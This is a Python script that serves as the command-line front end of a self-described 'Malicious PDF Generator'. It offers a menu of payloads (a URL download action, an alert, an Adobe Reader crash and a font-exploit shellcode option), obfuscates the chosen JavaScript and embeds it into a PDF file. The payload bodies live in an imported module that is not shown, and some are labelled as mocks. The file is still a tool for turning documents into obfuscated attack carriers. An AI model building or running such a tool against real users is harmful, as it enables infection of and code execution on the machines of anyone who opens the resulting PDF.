from malicious_pdf_generator import obfuscated_code, embedded_javascript_into_pdf, const
import argparse
import pyfiglet


def cli():
    """
    Command-line interface for the malicious PDF generator.
    :return: argparse.Namespace: The parsed arguments.
    """
    parser = argparse.ArgumentParser(description="Generate a malicious PDF file.")
    parser.add_argument("-i", "--input",
                        help=const.INPUT_PDF_OPTION_HELP,
                        required=False,
                        default=const.INPUT_PDF_DEFAULT)
    parser.add_argument("-o", "--output",
                        help=const.OUTPUT_PDF_OPTION_HELP,
                        required=False,
                        default=const.OUTPUT_PDF_DEFAULT)
    arguments = parser.parse_args()

    return arguments


def generate_malicious_pdf(js_code, input_pdf, output_pdf):
    """
    Generates a malicious PDF file with embedded JavaScript code.
    :param js_code: javascript code
    :param input_pdf: template pdf file
    :param output_pdf: output pdf file
    :return:
    """
    embedded_javascript_into_pdf(obfuscated_code(js_code), input_pdf, output_pdf)
    print(f"JavaScript code embedded into {output_pdf}.")


def choose_payload():
    """
    Choose the payload to embed in the PDF file.
    :return: type: str: The payload to embed.
    """
    payload = None

    while payload is None:

        print("Choose the payload to embed into the pdf file:")
        print("1. Download file (URL action)")
        print("2. Alert message")
        print("3. Adobe Reader Calculate Crash")
        print("4. Adobe Reader Font Exploit Shellcode")
        choice = int(input("Enter the payload number: "))

        if choice == 1:
            payload = const.PAYLOAD_LAUNCH_URL_OPEN_ACTION
        elif choice == 2:
            payload = const.JS_CODE
        elif choice == 3:
            payload = const.PAYLOAD_MOCK_ADOBE_CRASH
        elif choice == 4:
            payload = const.PAYLOAD_MOCK_SHELLCODE_ADOBE_EXPLOIT      
        else:
            print("Invalid choice.")
    return payload


def banner():
    """
    Display the banner for the malicious PDF generator.
    :return:
    """
    ban = pyfiglet.figlet_format("Malicious PDF Generator", font="slant")
    print(ban)


def main():
    banner()
    args = cli()
    payload = choose_payload()
    generate_malicious_pdf(payload, args.input, args.output)


if __name__ == "__main__":
    main()
